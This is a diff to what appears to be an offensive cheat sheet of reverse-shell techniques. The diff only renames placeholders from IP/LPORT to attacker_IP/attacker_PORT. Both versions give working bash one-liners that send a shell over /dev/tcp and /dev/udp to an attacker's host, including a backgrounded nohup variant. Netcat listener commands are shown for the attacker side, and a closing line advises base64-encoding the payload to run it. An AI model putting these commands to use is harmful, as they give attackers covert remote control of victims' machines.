@@ -14,15 +14,15 @@ tags:
 Target
 
 ```
-$ /bin/bash -i >& /dev/tcp/<IP>/<LPORT> 0>&1
+$ /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1
 
-$ nohup 0<&103-;exec 103<>/dev/tcp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
+$ nohup 0<&103-;exec 103<>/dev/tcp/<attacker_IP>/<attacker_PORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
 ```
 
 Attacker
 
 ```
-userware@hackware-os:~$ nc -lnvp <LPORT>
+userware@hackware-os:~$ nc -lnvp <PORT>
 ```
 
 ## 02 - UDP Method
@@ -30,15 +30,15 @@ userware@hackware-os:~$ nc -lnvp <LPORT>
 Target
 
 ```
-$ /bin/bash -i >& /dev/udp/<IP>/<LPORT> 0>&1
+$ /bin/bash -i >& /dev/udp/<attacker_IP>/<attacker_PORT> 0>&1
 
-$ nohup 0<&103-;exec 103<>/dev/udp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
+$ nohup 0<&103-;exec 103<>/dev/udp/<attacker_IP>/<attacker_PORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
 ```
 
 Attacker
 
 ```
-userware@hackware-os:~$ nc -luvp <LPORT>
+userware@hackware-os:~$ nc -luvp <PORT>
 ```
 
 You can encode it with base64 then execute it.
